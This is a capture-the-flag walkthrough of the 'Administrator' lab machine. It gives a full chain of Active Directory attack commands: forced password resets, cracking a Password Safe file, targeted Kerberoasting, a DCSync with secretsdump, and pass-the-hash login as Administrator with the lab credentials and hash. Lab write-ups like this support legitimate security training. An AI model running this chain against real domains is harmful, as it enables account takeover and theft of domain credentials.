**NOTES:**

VPN 10.10.11.42

**Machine Information**

As is common in Windows pentests, you will start the Certified box with
credentials for the following account: **Username: Olivia Password:
ichliebedich**

**1**. Add **administrator.htb** to **/etc/hosts** file

**RUN:** **sudo nano /etc/hosts**

**2**. nmap

**RUN: nmap -sV -Pn 10.10.11.42**

![](Administrator/media/image1.png)

**MORE COMPREHENSIVE Nmap scan (Port 5985 = WinRM remote
login)**

**RUN: sudo nmap -Pn -p- \--min-rate 2000 -sC -sV -oN nmap-scan.txt
administrator.htb**

![](Administrator/media/image2.png)

**3**. **crackmapexec** (Gathers info about **HOSTS, SERVICES, SHARES**)

**RUN: crackmapexec smb administrator.htb -u "Olivia" -p "ichliebedich"
--rid-brute \| grep SidTypeUser**

![](Administrator/media/image3.png)

**4**. **bloodhound** (**Downloading** **USERS, GROUPS, COMPUTERS,
DOMAINS, GPOs, ACLs** in **JSON-files**)

**RUN: bloodhound-python -u Olivia -p 'ichliebedich' -c All -d
administrator.htb -ns 10.10.11.42**

![](Administrator/media/image4.png)

**5**. ADD **dc.administrator.htb** (found in STEP 3) to **/etc/hosts
file**

\- Press **CTRL+Y** to SAVE

\- Press **Y** to CONFIRM (exits the hosts file)

![](Administrator/media/image5.png)

**6**. **RUN: sudo neo4j console** and **START Bloodhound APP**

![](Administrator/media/image6.png)

\- Login with **USER:** **neo4j** and **PASSWORD:** **as163452 (Both
preconfigured, see STEPS in CERTIFIED MACHINE)**

\- Import **JSON-files**

**7**. Check **OUTBOUND OBJECT CONTROL** of
**Olivia@Administrator.htb**, she has FullAccess (**GenericAll**) to
Michael account

**INFO:** Olivia can force Michael to change his password

![](Administrator/media/image7.png)

**8**. Check **OUTBOUND OBJECT CONTROL** of
**Michael@Administrator.htb**, he has **ForceChangePassword** to
Benjamin account

![](Administrator/media/image8.png)

**USER - FOOTHOLD**

**1**. Use Olivia\'s account, to **change PASSWORD** of **Michael
account** (Olivia has GenericALL (FULL ACCESS) to Michael\'s account!!)

**RUN:** **bloodyAD -u \"olivia\" -p \"ichliebedich\" -d
\"Administrator.htb\" \--host \"10.10.11.42\" set password \"Michael\"
\"12345678\"**

![](Administrator/media/image9.png)

**2**. Use Michael\'s account, to **change PASSWORD** of **Benjamin
account**

**RUN:** **bloodyAD -u \"Michael\" -p \"12345678\" -d
\"Administrator.htb\" \--host \"10.10.11.42\" set password \"Benjamin\"
\"12345678\"**

![](Administrator/media/image10.png)

**3**. Use Benjamin\'s account, to **LOGIN via FTP**

\- Download the found file: Backup.psafe3

**INFO:** ftp command establishes a connection to the server

**RUN:** **ftp administrator.htb**

**INFO:** ls lists all files in the directory

**RUN:** **ls**

**INFO:** **Backup.psafe3** is the filename

**RUN:** **get Backup.psafe3**

![](Administrator/media/image11.png)

**INFO:** psafe3 files are PASSWORD-SAFE FILES. Cannot be cracked
directly!

![](Administrator/media/image12.png)

**HASH can be read with** **TOOL:** **PWsafe2John**

**4**. **Extracts** the **PASSWORD HASH** **from** file:
**Backup.psafe3** (PWsafe database file)

**RUN:** **pwsafe2john Backup.psafe3**

![](Administrator/media/image13.png)

**4.1** Create a TEXT file and **paste HASH code in file. Name the file
hash.txt.**

![](Administrator/media/image14.png)

**4.2** **Cracked PW** with john. **PASSWORD: tekieromucho**

**RUN:** **john hash.txt --wordlist=/home/kali/Desktop/rockyou.txt**

![](Administrator/media/image15.png)

**5**. Install TOOL: Passwordsafe.

![](Administrator/media/image16.png)

**5.2** Open Backup.psafe3, use **PASSWORD: tekieromucho**

![](Administrator/media/image17.png)

Paste PASSWORD tekieromucho

![](Administrator/media/image18.png)

**5.4** Copy ALL Usernames and Passwords of ALL USERS

![](Administrator/media/image19.png)

**5.5** Create file to **note ALL Usernames** and **Passwords**

![](Administrator/media/image20.png)

**5.6** **Look for the rights of all 3 users** in Bloodhound or Try &
Error PASSWORDS by manually testing it

**INFO:** Found Emily has CanPSRemote right.

![](Administrator/media/image21.png)

**6**. Login remotely and get USER.TXT. Paste Emily\'s Password from
STEP 5.5

**RUN:** **evil-winrm -i 10.10.11.42 -u emily -p
UXLCI5iETUsIBoFVTj8yQFKoHjXmb**

![](Administrator/media/image22.png)



**PRIVILEGE ESCALATION**

**7**. Check Bloodhound. Emily has GenericWrite (Write Access) to
Ehan\'s account

**INFO:**

Because of Emily\'s access to **Ethan**, he **can use Targeted
Kerberoasting attack**

**targetedKerberoast.py** is a Python script that, like many others
(e.g. GetUserSPNs.py ),

**prints a \"kerberoast\" hash** for user accounts that have SPNs
(Service Principal Name) set.

This tool brings the following additional functionality: for each user
that does not have an SPN,

it attempts to set one ( abusing write access to the attribute ),

prints the \"kerberoast\" hash, and deletes the temporary SPN that was
set for the operation.

![](Administrator/media/image23.png)

**SPN (Service Principal Name)** examples:

![](Administrator/media/image24.png)
![](Administrator/media/image25.png)
![](Administrator/media/image26.jpeg)

**7.1** **Download targetedKerberoast.py** FILE + **sync time** +
**Displays HASH** of Ethan\'s account

**Source:**
<https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py>

**INFO: Description of targetedKerberoast.py: See STEP 7**

**RUN:** **python targetedKerberoast.py -u \"emily\" -p
\"UXLCI5iETUsIBoFVTj8yQFKoHjXmb\" -d \"Administrator.htb\" \--dc-ip
10.10.11.42**

![](Administrator/media/image27.png)

**7.2** Crack it with john

**RUN: john hash.txt --wordlist=/home/kali/Desktop/rockyou.txt**

**Put Ehan's HASH into the hash.txt file!**

![](Administrator/media/image28.png)

**8**. Look for Ethans account: **DCSync relation found**

**INFO:**



This edge represents the combination of **GetChanges** and
**GetChangesAll**. The **combination of these two permissions grants**
the principal the ability to perform a **DCSync attack**.

Use this to get the Administrator\'s password hash

secretsdump

**Secretsdump.py** is a script in the Impacket framework that **can also
export the hash of users** on the domain controller **through the DCSync
technology**.

The principle of this tool is to first use the provided user login
credentials to remotely connect to the domain controller through smbexec
or wmiexec and obtain high permissions,

and then export the hash of local accounts from the registry, and export
the hash of all domain users through Dcsync or from the NTDS.dit file.

Its biggest advantage is that it supports connecting to the domain
controller from computers outside the domain.

![](Administrator/media/image30.png)

**8.1** Use cracked **limpbizkit** Password

**INFO: Extracts Hashes, passwords, Kerberos keys. Allows to perform
lateral movement or gain further access within a network**

**RUN:** **impacket-secretsdump
\"Administrator.htb/ethan:limpbizkit\"@\"dc.Administrator.htb\"**

![](Administrator/media/image31.png)

**8.2** **Login remotely** with **CREDENTIALS from STEP 8.1** (**USER +
PASSWORD**)

**RUN:** **evil-winrm -i administrator.htb -u administrator -H
\"3dc553ce4b9fd20bd016e098d2d2fd2e\"**

**When logged in: Switch to ../desktop**

**RUN:** **cd ../desktop**

![](Administrator/media/image32.png)
